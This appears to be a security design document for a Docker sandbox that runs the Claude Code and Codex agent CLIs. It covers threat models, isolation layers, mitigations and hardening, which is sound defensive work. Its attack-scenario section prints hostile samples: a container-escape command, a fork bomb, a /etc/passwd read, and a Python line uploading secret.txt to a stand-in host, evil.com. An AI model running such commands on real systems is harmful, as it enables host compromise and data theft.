# Security Architecture - sclaude / scodex

Security analysis of the shared Docker sandbox for running Claude Code through
`sclaude` or Codex through `scodex`.

## Threat Model

### What We're Protecting Against

1. **Path Traversal Attacks**: Accessing files outside workspace using `..`, symlinks, or other techniques
2. **Container Escape**: Breaking out of Docker container to access host system
3. **Privilege Escalation**: Gaining root or elevated privileges
4. **Resource Exhaustion**: Consuming unlimited CPU, memory, or processes
5. **Credential Theft**: Accessing SSH keys, API tokens outside workspace
6. **Data Exfiltration**: Uploading workspace files to malicious servers

### What We're NOT Protecting Against

1. **Intentional Malicious Use**: User deliberately creating harmful tasks
2. **Physical Access**: Someone with physical access to the host
3. **Zero-day Container Escapes**: Unknown Docker vulnerabilities
4. **Social Engineering**: Tricking user into accepting malicious changes

## Security Layers

### Layer 1: Filesystem Isolation

#### Workspace Mount
```bash
-v "$WORKSPACE_PATH:$WORKSPACE_PATH:rw"
```

**Protection**: Uses absolute path, mounted at same location in container

**Prevents**:
- ✅ `../../../etc/passwd` - Cannot traverse outside mount
- ✅ `~/sensitive-file` - Only workspace accessible
- ✅ Moving files outside workspace - Mount boundary enforced by kernel

**How It Works**:
- Docker bind mounts create isolated filesystem namespace
- Kernel enforces boundaries at mount point
- No amount of `..` traversal can escape

#### Docker Volumes for Persistence
```bash
-v sclaude-config:/sclaude-config:rw \
-v scodex-config:/scodex-config:rw \
-v sagent-rootfs:/home/agent:rw \
-v sagent-npm:/home/agent/.npm-global:rw \
-v sagent-pip:/home/agent/.local:rw \
-v sagent-apt-cache:/var/cache/apt:rw \
-v sagent-apt-lists:/var/lib/apt/lists:rw
```

**Protection**:
- Isolated from host filesystem
- Stored in Docker-managed storage
- Cannot access host directories

**Benefits**:
- ✅ Credentials persist across runs
- ✅ Package caches persist
- ✅ No conflicts with host files
- ✅ Clean separation of concerns

### Layer 2: User Privileges

#### Non-Root User
```dockerfile
ARG USER_UID=1000
ARG USER_GID=1000
RUN ... useradd -o -u ${USER_UID} ... agent

USER agent
```

**Protection**:
- All processes run as non-root
- UID/GID matches host user (for file permissions)

**Prevents**:
- ✅ Modifying system configuration
- ✅ Accessing privileged operations
- ✅ Installing system-level packages without the allowlisted sudo path

#### Sudo Configuration
```dockerfile
RUN echo 'agent ALL=(root) NOPASSWD: /usr/bin/apt-get, /usr/bin/apt, /usr/bin/dpkg' > /etc/sudoers.d/agent
```

**Limited Sudo**:
- Only for apt/dpkg commands
- No password required (for convenience)
- Package installs are supported for agent workflows

**Rationale**:
- Allows agent CLIs to install system dependencies while working
- Package manager cache/list directories persist in Docker volumes
- Root is inside the container only; host isolation still depends on Docker

### Layer 3: Capability Limiting

```bash
--cap-drop=ALL \
--cap-add=CHOWN \
--cap-add=DAC_OVERRIDE \
--cap-add=FOWNER \
--cap-add=FSETID \
--cap-add=SETGID \
--cap-add=SETUID \
--cap-add=SYS_CHROOT \
--cap-add=NET_BIND_SERVICE
```

**Protection**:
- Starts with no Linux capabilities
- Adds back only the set needed for allowlisted `sudo apt` package installs and
  low-port binding

**Prevents**:
- ✅ `CAP_SYS_ADMIN` - Cannot mount filesystems or create namespaces
- ✅ `CAP_SYS_PTRACE` - Cannot debug other processes
- ✅ `CAP_NET_ADMIN` - Cannot modify network configuration
- ✅ `CAP_SYS_MODULE` - Cannot load kernel modules
- ✅ `CAP_MKNOD` - Cannot create device files

**Result**: Root inside the container can manage packages, but broad
container-control capabilities remain unavailable.

### Layer 4: Controlled In-Container Root

The runtime intentionally does not use `no-new-privileges`, because that would
break `sudo apt`. The tradeoff is explicit: agent CLIs can become root inside the
container for allowlisted package-management commands.

**Protection still provided**:
- Docker socket is not mounted
- Host filesystem access is limited to the workspace bind mount
- Resource limits still apply
- The capability set is restricted

### Layer 5: Resource Limits

```bash
--memory="4g" \
--cpus="2" \
--pids-limit="100" \
--ulimit nofile=8192:8192
```

**Memory Limit (4GB)**:
- Prevents memory exhaustion attacks
- OOM killer terminates processes at limit
- Host system unaffected

**CPU Limit (2 cores)**:
- Prevents CPU exhaustion (bitcoin mining, etc.)
- Throttles to 2 CPUs max
- Host remains responsive

**Process Limit (100)**:
- Prevents fork bombs
- fork() fails at limit
- System remains stable

**File Descriptor Limit (8192)**:
- Prevents FD exhaustion
- Limits open files

### Layer 6: Network Isolation

```bash
--network bridge
```

**Protection**:
- Isolated network namespace
- Cannot use container `localhost` to access host loopback services

**Prevents**:
- ✅ Sniffing host traffic
- ✅ Layer 2 attacks (ARP spoofing)

**Allows**:
- ✅ Internet access (for package downloads)
- ✅ Outbound connections
- ⚠️ Host services may still be reachable through Docker gateway addresses or
  Docker Desktop host aliases depending on platform

**Limitation**:
- ⚠️ Can exfiltrate workspace data (inherent tradeoff for package management)

### Layer 7: Docker Socket NOT Mounted

**Critical**:
```bash
# We NEVER mount docker socket:
# -v /var/run/docker.sock:/var/run/docker.sock  ❌ DANGEROUS
```

**Why This Matters**:
- Docker socket = root-equivalent host access
- Could create privileged container and escape
- Major container escape vector

**Our Approach**:
- ✅ Socket NOT mounted
- ✅ Cannot interact with Docker daemon
- ✅ Cannot create/modify containers

### Layer 8: Ephemeral Container

```bash
--rm
```

**Protection**:
- Container deleted on exit
- Filesystem changes discarded (except volumes)
- Clean slate on each run

**Benefits**:
- ✅ Malware doesn't persist in system
- ✅ apt packages reset each run
- ✅ Cannot build up cruft over time

**What Persists** (by design):
- Docker volumes (credentials, tool config, caches)
- Workspace files (the point of the tool)

## Attack Scenarios & Mitigations

### Scenario 1: Path Traversal via `..`

**Attack**:
```python
with open('../../../etc/passwd', 'r') as f:
    data = f.read()
```

**Mitigation**:
- ✅ **BLOCKED**: Mount boundary enforced by kernel
- `..` stays within workspace
- Even symlinks cannot break out

### Scenario 2: Container Escape via Docker Socket

**Attack**:
```bash
docker run -v /:/host --privileged alpine chroot /host
```

**Mitigation**:
- ✅ **BLOCKED**: Socket not mounted
- Cannot access Docker daemon
- Cannot create containers

### Scenario 3: Container Root via Sudo

**Attack**:
```bash
sudo apt-get install some-package
```

**Mitigation**:
- ⚠️ **ALLOWED FOR PACKAGE MANAGEMENT**: `apt`, `apt-get`, and `dpkg` are
  allowlisted because agent CLIs may need system dependencies.
- Docker socket remains unavailable.
- Host filesystem access remains limited to the mounted workspace.
- Capabilities remain limited to the package-management set.

### Scenario 4: Fork Bomb

**Attack**:
```bash
:(){ :|:& };:
```

**Mitigation**:
- ✅ **BLOCKED**: --pids-limit=100
- fork() fails at limit
- System remains responsive

### Scenario 5: Memory Exhaustion

**Attack**:
```python
data = []
while True:
    data.append([0] * 1000000)
```

**Mitigation**:
- ✅ **BLOCKED**: --memory=4g
- OOM killer terminates at limit
- Host unaffected

### Scenario 6: Data Exfiltration

**Attack**:
```python
import requests
requests.post('https://evil.com', files={'data': open('secret.txt')})
```

**Mitigation**:
- ⚠️ **PARTIALLY MITIGATED**:
  - Can exfiltrate workspace files (inherent tradeoff)
  - Cannot access SSH keys or credentials outside workspace, except auth/config files intentionally synced into `sclaude-config` or `scodex-config`
  - Network access needed for package management

**Best Practices**:
- Don't put secrets in workspace
- Review changes via git diff
- Use git to track all modifications

### Scenario 7: Malicious Package

**Attack**:
```bash
pip install evil-package
```

**Mitigation**:
- ✅ **PARTIALLY MITIGATED**:
  - Runs as non-root
  - Container is ephemeral
  - No access to host files
  - Limited by capabilities

**Blast Radius**:
- Can affect workspace
- Cannot persist to system
- Cannot access SSH keys

## Known Limitations

### 1. Network Access

**Issue**: Full internet access

**Impact**:
- Needed for package downloads
- Can exfiltrate workspace data

**Mitigations**:
- Don't put secrets in workspace
- Review git diff before committing
- Monitor for suspicious activity

### 2. Workspace Access

**Issue**: Full read-write to workspace

**Impact**:
- Can delete/modify all files
- Can commit bad code

**Mitigations**:
- Use git (commit before running)
- Review changes (git diff)
- Can revert (git reset --hard)

### 3. Dependency Trust

**Issue**: Can install any packages

**Impact**:
- Supply chain attacks possible

**Mitigations**:
- Isolated in container
- Package cache/list state can persist in Docker volumes
- Review installed packages

## Security Checklist

**Before running**:
- [ ] Git commit - Save current state
- [ ] No secrets in workspace
- [ ] Claude or Codex auth available if needed

**After running**:
- [ ] Review changes - `git diff`
- [ ] Test functionality
- [ ] Audit dependencies
- [ ] Commit or revert

## Hardening Recommendations

### Maximum Security

1. **Disable network**:
```bash
--network none
```

2. **Read-only workspace** (analysis only):
```bash
-v "$WORKSPACE_PATH:$WORKSPACE_PATH:ro"
```

3. **Reduce resource limits**:
```bash
MEMORY_LIMIT="2g"
CPU_LIMIT="1"
PIDS_LIMIT="50"
```

4. **Add AppArmor profile**:
```bash
--security-opt apparmor=docker-default
```

5. **Use gVisor runtime**:
```bash
--runtime=runsc
```

## Comparison

| Feature | sclaude / scodex | Native CLI |
|---------|------------------|------------|
| Filesystem | Workspace only | Full system |
| Credentials | Docker volume | Keychain/file |
| Path traversal | Blocked | Possible |
| In-container root | Allowed for package management | Depends on OS |
| Resource limits | Enforced | None |
| Network isolation | Bridge | Full access |
| Container escape | Protected | N/A |
| Performance | Native speed | Native speed |

## Conclusion

sclaude and scodex provide **strong isolation** while maintaining agent CLI
functionality:

**Strong Protections**:
- ✅ Path traversal blocked
- ✅ Container escape prevented
- ✅ Host privilege escalation constrained by Docker isolation
- ✅ Resource exhaustion prevented
- ✅ Credentials persist securely

**Moderate Protections**:
- ⚠️ Network access (needed for packages)
- ⚠️ Workspace fully accessible (by design)

**Best Used For**:
- Development tasks with version control
- Automated testing and refactoring
- Code generation and bug fixing
- Projects without sensitive credentials

**Not Suitable For**:
- Processing untrusted codebases
- Handling sensitive credentials
- Unattended operation without monitoring
